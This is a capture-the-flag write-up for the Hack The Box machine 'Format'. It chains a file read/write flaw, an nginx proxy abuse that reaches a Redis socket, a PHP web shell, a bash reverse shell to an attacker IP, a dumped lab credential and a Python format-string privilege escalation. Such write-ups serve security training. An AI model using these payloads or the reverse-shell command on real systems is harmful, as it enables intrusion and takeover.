## Format

https://app.hackthebox.com/machines/Format

### User Flag

Basic enumeration lead us to app.microblog.htb, microblog.htb and microblog.htb:3000/cooper/microblog.

The last one has the source code of microblog.htb.

<br>

#### File Read

Inserting a txt in our blog, we get this body request.

```
id=vy36c18xkkb&txt=inserting
```

This id refers to the file created inside /content. We discover this by looking the 'sunny' directory on source code.

So we can change the name of the file being stored. Also, this id is stored in /content/order.txt.

If we insert a php file, it will be read, not executed.

We can read files by replacing the id and accessing our blog.

```
id=/etc/passwd&txt=inserting
```

We create a script to read files like ippsec in `fileread.py`.

<br>

#### File Write
Reading /etc/nginx/sites-enabled/default, this is interesting:

```
location ~ /static/(.*)/(.*) {
                resolver 127.0.0.1;
                proxy_pass http://$1.microbucket.htb/$2;
        }
```

We can write files only if our user is pro.

```php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

This is the function.
```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

So we need to abuse the above nginx configuration to make our user pro.
```
proxy_pass http://$1.microbucket.htb/$2;
```

If we access something like `microblog.htb/static/css/file.txt` the proxy will return `css.microbucket.htb/file.txt`.

So we use this to access the redis socket and upgrade our user to Pro:
```
HSET /static/unix%3a///var/run/redis/redis.sock%3aippsec%20pro%20true%20/a HTTP/1.1
Host: microblog.htb
```

Now we have permission to write into /uploads.
```
id=../uploads/shell.php&txt=<?php SYSTEM($_REQUEST['cmd']); ?>
```

Get reverse shell using POST.
```
POST /uploads/shell.php HTTP/1.1
Host: test.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: username=vtbgbeskeu5ebeuru1vo81d862
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/1337+0>%261'
```

#### Dump Redis Credentials
Interact with redis and discover credentials: cooper:zooperdoopercooper.
```
redis-cli -s /var/run/redis/redis.sock

keys *

HGETALL cooper.cooper
```

<br>

### Privilege Escalation

Cooper can run **license** as root:
```bash
sudo -l
(root) /usr/bin/license
```

Reading this binary, we se that there is a secret readable only by root.
```python3
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

The trick here is that we can control what happens in `format` with last-name, so we crete a new user in redis.
```
hset rooted username rooted

hset rooted first-name rootedUser

hset rooted last-name "{license.__init__.__globals__[secret]}"

sudo license -p rooted
```
